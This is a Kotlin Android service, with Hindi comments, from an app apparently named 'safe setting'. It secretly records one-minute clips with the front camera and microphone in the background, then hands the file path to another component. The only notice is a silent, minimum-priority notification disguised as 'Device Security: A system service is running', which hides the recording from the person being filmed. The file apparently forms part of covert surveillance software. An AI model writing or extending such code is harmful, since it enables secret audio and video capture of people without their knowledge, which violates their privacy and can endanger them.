package com.safe.setting.app.services.video

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.LayoutInflater
import android.view.Surface
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.safe.setting.app.R
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit

// यह सर्विस बैकग्राउंड में वीडियो रिकॉर्ड करने के लिए जिम्मेदार है।
class VideoRecordingService : Service() {

    // जरूरी वेरिएबल्स
    private lateinit var windowManager: WindowManager
    private lateinit var cameraManager: CameraManager
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var mediaRecorder: MediaRecorder? = null
    private var videoFile: File? = null
    private lateinit var surface: Surface
    private val cameraOpenCloseLock = Semaphore(1)
    private var isRecording = false
    private val handler = Handler(Looper.getMainLooper())
    private var cameraFacing = CameraCharacteristics.LENS_FACING_FRONT

    // यह सर्विस शुरू होने पर कॉल होता है।
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // नोटिफिकेशन दिखाएं ताकि उपयोगकर्ता को पता चले कि रिकॉर्डिंग चल रही है।
        startForeground(NOTIFICATION_ID, createNotification())

        // कमांड से कैमरा फेसिंग प्राप्त करें, डिफॉल्ट फ्रंट कैमरा है।
        cameraFacing = intent?.getIntExtra("camera_facing", CameraCharacteristics.LENS_FACING_FRONT)
            ?: CameraCharacteristics.LENS_FACING_FRONT

        // रिकॉर्डिंग शुरू करें।
        startRecording()

        // 1 मिनट (60,000 मिलीसेकंड) के बाद रिकॉर्डिंग बंद करने के लिए टाइमर सेट करें।
        handler.postDelayed({
            stopRecording()
        }, 60000)

        return START_NOT_STICKY
    }

    // रिकॉर्डिंग शुरू करने की प्रक्रिया।
    private fun startRecording() {
        if (isRecording) return // अगर पहले से रिकॉर्डिंग हो रही है तो कुछ न करें।

        // जरूरी मैनेजर्स को इनिशियलाइज़ करें।
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager

        // रिकॉर्डिंग शुरू करें।
        Thread {
            try {
                // कैमरे को खोलने का प्रयास करें।
                if (!cameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) {
                    throw RuntimeException("Time out waiting to lock camera opening.")
                }
                openCamera(cameraFacing)
                isRecording = true
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start recording", e)
                stopSelf() // त्रुटि होने पर सर्विस बंद करें।
            }
        }.start()
    }

    // रिकॉर्डिंग रोकने की प्रक्रिया।
    private fun stopRecording() {
        if (!isRecording) return // अगर रिकॉर्डिंग नहीं हो रही है तो कुछ न करें।
        isRecording = false
        try {
            // मीडिया रिकॉर्डर को रोकें और रिलीज़ करें।
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            mediaRecorder?.release()
            mediaRecorder = null

            // कैमरे को बंद करें।
            closeCamera()

            // फोरग्राउंड सर्विस को रोकें।
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE)
            } else {
                @Suppress("DEPRECATION")
                stopForeground(true)
            }


            // इंटरैक्टर को सूचित करें कि वीडियो रिकॉर्ड हो गया है।
            val broadcastIntent = Intent("VIDEO_RECORDED_ACTION")
            broadcastIntent.putExtra("file_path", videoFile?.absolutePath)
            sendBroadcast(broadcastIntent)

        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop recording", e)
        } finally {
            // सर्विस को बंद करें।
            stopSelf()
        }
    }

    // कैमरा खोलने का फ़ंक्शन।
    @SuppressLint("MissingPermission")
    private fun openCamera(facing: Int) {
        val cameraId = getCameraId(facing)
        if (cameraId == null) {
            Log.e(TAG, "No suitable camera found.")
            stopSelf()
            return
        }
        try {
            // कैमरा डिवाइस को एसिंक्रोनस रूप से खोलें।
            cameraManager.openCamera(cameraId, cameraStateCallback, handler)
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Cannot access the camera.", e)
            stopSelf()
        }
    }

    // कैमरा बंद करने का फ़ंक्शन।
    private fun closeCamera() {
        try {
            cameraOpenCloseLock.acquire()
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null
            mediaRecorder?.release()
            mediaRecorder = null
        } catch (e: InterruptedException) {
            throw RuntimeException("Interrupted while trying to lock camera closing.", e)
        } finally {
            cameraOpenCloseLock.release()
        }
    }

    // कैमरा डिवाइस की स्थिति में बदलाव को संभालने के लिए कॉलबैक।
    private val cameraStateCallback = object : CameraDevice.StateCallback() {
        override fun onOpened(camera: CameraDevice) {
            cameraDevice = camera
            cameraOpenCloseLock.release()
            startPreviewAndRecording()
        }

        override fun onDisconnected(camera: CameraDevice) {
            cameraOpenCloseLock.release()
            camera.close()
            cameraDevice = null
        }

        override fun onError(camera: CameraDevice, error: Int) {
            cameraOpenCloseLock.release()
            camera.close()
            cameraDevice = null
            Log.e(TAG, "Camera error: $error")
            stopSelf()
        }
    }

    // रिकॉर्डिंग के लिए MediaRecorder को तैयार करने का फ़ंक्शन।
    @SuppressLint("NewApi")
    private fun setupMediaRecorder() {
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        videoFile = createVideoFile() // वीडियो फ़ाइल बनाएँ।
        mediaRecorder?.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setOutputFile(videoFile?.absolutePath)
            setVideoEncodingBitRate(1000000) // बिटरेट कम करें ताकि फ़ाइल का आकार छोटा हो।
            setVideoFrameRate(15) // फ्रेम दर कम करें।
            setVideoSize(640, 480) // रिज़ॉल्यूशन कम करें।
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            try {
                prepare()
            } catch (e: IOException) {
                Log.e(TAG, "MediaRecorder prepare failed", e)
                stopSelf()
            }
        }
    }

    // कैमरा प्रीव्यू और रिकॉर्डिंग शुरू करने का फ़ंक्शन।
    private fun startPreviewAndRecording() {
        if (cameraDevice == null) return

        setupMediaRecorder()
        val surfaceList = ArrayList<Surface>()

        // MediaRecorder के लिए सतह प्राप्त करें।
        surface = mediaRecorder!!.surface
        surfaceList.add(surface)

        try {
            val captureRequestBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
            captureRequestBuilder.addTarget(surface)

            // कैप्चर सत्र बनाएँ।
            @Suppress("DEPRECATION")
            cameraDevice!!.createCaptureSession(surfaceList,
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        try {
                            session.setRepeatingRequest(captureRequestBuilder.build(), null, handler)
                            mediaRecorder?.start() // रिकॉर्डिंग शुरू करें।
                        } catch (e: CameraAccessException) {
                            Log.e(TAG, "Failed to start capture session", e)
                            stopSelf()
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Failed to configure capture session")
                        stopSelf()
                    }
                }, handler
            )
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Camera access exception", e)
            stopSelf()
        }
    }

    // निर्दिष्ट फेसिंग (फ्रंट/बैक) के लिए कैमरा आईडी प्राप्त करने का फ़ंक्शन।
    private fun getCameraId(facing: Int): String? {
        try {
            for (cameraId in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                if (characteristics.get(CameraCharacteristics.LENS_FACING) == facing) {
                    return cameraId
                }
            }
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Cannot access camera", e)
        }
        return null
    }

    // नई वीडियो फ़ाइल बनाने का फ़ंक्शन।
    private fun createVideoFile(): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val storageDir: File? = getExternalFilesDir("Videos")
        return File.createTempFile("VIDEO_${timeStamp}_", ".mp4", storageDir)
    }

    // फोरग्राउंड सर्विस के लिए नोटिफिकेशन बनाने का फ़ंक्शन।
    private fun createNotification(): Notification {
        val channelId = "VideoRecordingServiceChannel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                channelId,
                "Video Recording Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Service for recording video in the background"
                // नोटिफिकेशन को साइलेंट करें।
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
        return NotificationCompat.Builder(this, channelId)
            // यहाँ एक छोटा और साधारण कैमरा आइकन दिखाएँ।
            .setSmallIcon(R.drawable.ic_user_alert)
            .setContentTitle("Device Security")
            .setContentText("A system service is running.")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    // सर्विस को बाइंड करने की आवश्यकता नहीं है, इसलिए null लौटाएँ।
    override fun onBind(intent: Intent?): IBinder? = null

    // सर्विस नष्ट होने पर कैमरे और अन्य संसाधनों को रिलीज़ करें।
    override fun onDestroy() {
        super.onDestroy()
        stopRecording()
    }

    companion object {
        private const val NOTIFICATION_ID = 12345
        private const val TAG = "VideoRecordingService"
    }
}

